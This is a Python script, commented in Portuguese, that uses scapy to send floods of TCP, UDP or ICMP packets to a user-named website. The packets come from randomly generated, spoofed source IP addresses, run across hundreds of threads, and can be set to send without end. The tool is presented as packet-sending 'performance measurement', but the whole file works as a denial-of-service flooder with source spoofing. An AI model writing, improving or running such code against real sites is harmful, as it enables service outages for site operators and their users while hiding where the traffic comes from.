import random
import threading
import socket
import time
import concurrent.futures
import os
from scapy.all import *

# Variáveis para medição de desempenho
packets_sent = 0
start_time = 0
response_time = 0

# Variáveis para controle de tráfego
max_packets_per_second = 100  # Valor padrão, pode ser ajustado pelo usuário
interval = 1.0 / max_packets_per_second

# Função para gerar uma lista de endereços IP aleatórios (para melhor desempenho)
def generate_random_ips(count):
    return [".".join(str(random.randint(1, 254)) for _ in range(4)) for _ in range(count)]

# Função para resolver o endereço IP associado ao site
def resolve_target_IP(target_site):
    try:
        target_IP = socket.gethostbyname(target_site)
        return target_IP
    except socket.gaierror:
        print("Não foi possível resolver o endereço IP do site.")
        return None

# Função para enviar pacotes a partir de endereços IP e portas aleatórias
def send_packet(source_ip, target_IP, source_port, packet_type, timeout):
    global packets_sent, response_time

    packet = IP(src=source_ip, dst=target_IP) / packet_type(sport=source_port)
    response = sr1(packet, timeout=timeout, verbose=0)

    if response:
        response_time = time.time() - start_time

    packets_sent += 1

# Função para enviar pacotes em paralelo
def send_packets(target_site, num_threads, specific_ports, packet_type, total_packets, timeout):
    global packets_sent, start_time, response_time, interval

    target_IP = resolve_target_IP(target_site)
    if not target_IP:
        return

    source_ips = generate_random_ips(num_threads)
    start_time = time.time()

    with concurrent.futures.ThreadPoolExecutor(max_workers=num_threads) as executor:
        while packets_sent < total_packets or total_packets == -1:
            futures = []
            for source_ip in source_ips:
                for source_port in specific_ports:
                    future = executor.submit(send_packet, source_ip, target_IP, source_port, packet_type, timeout)
                    futures.append(future)

            time.sleep(interval)

    end_time = time.time()
    elapsed_time = end_time - start_time

    # Resultados de desempenho
    packets_per_second = packets_sent / elapsed_time

    print("\n===== Resultados de Desempenho =====")
    print("Pacotes enviados: {}".format(packets_sent))
    print("Tempo total de envio: {:.2f} segundos".format(elapsed_time))
    print("Taxa de envio média: {:.2f} pacotes por segundo".format(packets_per_second))
    print("Tempo de resposta do site: {:.2f} segundos".format(response_time))

# Função que imprime o menu principal e retorna a escolha do usuário
def menu():
    global max_packets_per_second, interval

    print("===== Menu =====")
    print("1. Enviar pacotes")
    print("2. Configurar taxa máxima de envio")
    print("3. Sair")

    choice = input("Escolha uma opção: ")
    if choice == '2':
        max_packets_per_second = int(input("Digite a taxa máxima de envio de pacotes por segundo: "))
        interval = 1.0 / max_packets_per_second
        print("Taxa máxima de envio definida para {} pacotes por segundo.".format(max_packets_per_second))
    return choice

# Função principal do programa
def main():
    print("Bem-vindo ao programa de envio de pacotes.")

    while True:
        os.system('cls' if os.name == 'nt' else 'clear')  # Limpar a tela antes de exibir o menu
        choice = menu()

        if choice == '1':
            target_site = input("Digite o nome do site de destino: ")
            num_threads = int(input("Digite a quantidade de threads (recomendado até 500): "))

            while True:
                specific_ports = list(map(int, input("Digite as portas específicas separadas por espaços (exemplo: 80 443): ").split()))
                if not specific_ports:
                    print("Insira pelo menos uma porta específica.")
                else:
                    break

            while True:
                packet_type = input("Digite o tipo de pacote (TCP, UDP, ICMP): ").upper()
                if packet_type not in ["TCP", "UDP", "ICMP"]:
                    print("Tipo de pacote inválido. Digite novamente.")
                else:
                    break

            total_packets = int(input("Digite o número total de pacotes a serem enviados (-1 para enviar continuamente): "))
            timeout = int(input("Digite o tempo limite em segundos (0 para nenhum): "))

            if packet_type == "TCP":
                packet_type = TCP
            elif packet_type == "UDP":
                packet_type = UDP
            elif packet_type == "ICMP":
                packet_type = ICMP

            send_packets(target_site, num_threads, specific_ports, packet_type, total_packets, timeout)
        elif choice == '3':
            print("Saindo do programa.")
            break
        else:
            print("Opção inválida. Digite novamente.")

if __name__ == "__main__":
    main()
                                             
